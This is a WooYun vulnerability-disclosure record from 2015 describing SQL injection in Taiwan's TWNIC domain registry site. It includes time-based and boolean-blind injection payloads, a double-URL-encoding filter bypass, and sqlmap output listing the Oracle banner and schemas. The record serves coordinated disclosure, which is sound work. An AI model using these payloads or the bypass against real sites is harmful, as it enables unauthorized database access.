{"id": 66918, "wybug_id": "wooyun-2015-0142678", "wybug_title": "台湾TWNIC存在SQL注入(影响超过40W个域名设定)", "wybug_corp": "rs.twnic.net.tw", "wybug_author": "路人甲", "wybug_date": "2015-09-22 08:33", "wybug_open_date": "2015-11-09 09:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向公众公开  简要描述： 台湾的TWNIC应该等同于我国的CNNIC都是管理域名的国家网站,这应该能上首页了吧~ 详细说明：  故事是这样开始的,无意间逛到TWNIC,发现只要输入域名及判别密码即可进行修改\n\n这就有点意思了....找到下列两个网址,经过一些测试大概确定存在SQL注入\n(未修复)https://**.**.**.**/cgi-bin/whois.cgi?query=wwww&sld=**.**.**.**https://**.**.**.**/cgi-bin/whois.cgi?query=wwww'%2b(select%20*%20from%20(select(sleep(20)))a)%2b'&sld=**.**.**.**(已修复)https://**.**.**.**/cgi-bin/newdn.cgi?dname=wwww&sld=**.**.**.**&x=18&y=6\n但是却无法捞出数据,这肯定有些机制在阻挡刻意浏览下网站,发现都是cgi或是html,思考下这查询功能该不会是串接系统来达到的吧?如果是的话,说不定2次URL编码可以绕过...经由一些测试发现,查询域名是否注册的网址,确实存在2次URL编码问题,参数为sld\nhttps://**.**.**.**/cgi-bin/newdn.cgi?dname=wwww&sld=**.**.**.**&x=18&y=6\n不啰唆,上map上tamper\nwsqlmap resumed the following injection point(s) from stored session:---Parameter: sld (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: dname=wwww&sld=**.**.**.**' AND 7135=7135 AND 'hmfs'='hmfs&x=18&y=6    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: dname=wwww&sld=**.**.**.**' AND 6478=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'iddN'='iddN&x=18&y=6---web application technology: Apacheback-end DBMS: Oraclecurrent user is DBA:    Falsebanner:    'Oracle9i Enterprise Edition Release **.**.**.**.0 - 64bit Production'current schema (equivalent to database on Oracle):    'DNS**9I'available databases [4]:[*] DNS**[*] OUTLN[*] SYS[*] SYSTEM\n\n\n\n\n就到这里吧....不继续其实是...无奈网络质量特烂,上面那些数据就花1个礼拜的时间了...另外好像也修复,所以就上来公开了---还有一个额外的发现,SQLMAP的Oracle的current_db query语法有错,有兴趣可查看下\nsqlmap\\xml\\queries.xml->Oracle的current_db\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-09-25 09:46 厂商回复： 感謝通知！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}